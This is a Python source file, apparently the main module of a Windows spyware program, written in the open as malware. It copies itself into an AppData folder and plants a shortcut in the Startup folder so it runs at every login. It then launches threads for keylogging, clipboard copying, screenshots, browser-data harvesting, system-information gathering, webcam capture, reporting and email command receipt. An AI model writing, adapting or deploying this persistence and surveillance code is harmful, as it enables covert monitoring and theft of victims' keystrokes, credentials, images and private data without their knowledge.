#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Zunayed Hassan'

import os
import shutil
import sys
from Settings import *
from os.path import expanduser
from Keylogger import *
from ClipboardCopier import *
from ScreenshotTaker import *
from WebBrowserDigger import *
from SystemInformation import *
from WebCamImageTaker import *
from Reporter import *
from ReceiveEmail import *


"""
CLASS NAME:     SpiceProgram

PURPOSE:        To run every component in this spyware have, according to its settings
"""
class SpiceProgram:
    def __init__(self):
        # Checking is spyware agent is already exist or not
        if not os.path.exists(AGENT_LOCATION + (AGENT_NAME + ".exe")):
            # If spyware directory isn't already exist, then create a new one
            if not os.path.exists(AGENT_LOCATION):
                os.makedirs(AGENT_LOCATION)
                os.makedirs(REPORT_LOCATION)

            # Copy this spyware to C:\Users\< account_name >\AppData\< spyware_directory >\
            shutil.copy((AGENT_NAME + ".exe"), (AGENT_LOCATION + AGENT_NAME + ".exe"))

            # Create a shortcut to Windows Startup location, so that every time user logged into the Windows,
            # the spyware will also start too
            spywareAgentShortcutFileNameWithLocation = expanduser("~") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + AGENT_NAME + ".lnk"

            CreateShortcut(AGENT_LOCATION + AGENT_NAME + ".exe", spywareAgentShortcutFileNameWithLocation)

            # and also creating shortcut at current directory for manually launching spyware by user
            CreateShortcut(AGENT_LOCATION + AGENT_NAME + ".exe", os.getcwd() + "\\" + AGENT_NAME + ".lnk")

            # Now launch the program
            os.chdir(AGENT_LOCATION)
            os.system(AGENT_NAME + ".exe")

            # Close the program
            sys.exit()

        else:
            # Creating and running new thread for monitoring
            # Keylogger
            if RUN_KEYLOGGER:
                keylogger = Keylogger()
                keylogger.start()

            # Clipboard Copier
            if RUN_CLIPBOARD_COPIER:
                clipboardCopier = ClipboardCopier()
                clipboardCopier.start()

            # Screenshot taker
            if RUN_SCREENSHOT_TAKER:
                screenshotTaker = ScreenshotTaker()
                screenshotTaker.start()

            # Web browser digger
            if RUN_WEB_BROWSER_DIGGER:
                webBrowserDigger = WebBrowserDigger()
                webBrowserDigger.start()

            # System information
            if RUN_SYSTEM_INFORMATION:
                systemInfo = SystemInformation()
                systemInfo.start()

            # Webcam image taker
            if RUN_WEBCAM_IMAGE_TAKER:
                webCamImageTaker = WebCamImageTaker()
                webCamImageTaker.start()

            # Reporter
            if RUN_REPORTER:
                reporter = Reporter()
                reporter.start()

            # Email receiver
            receiveEmail = ReceiveEmail()
            receiveEmail.start()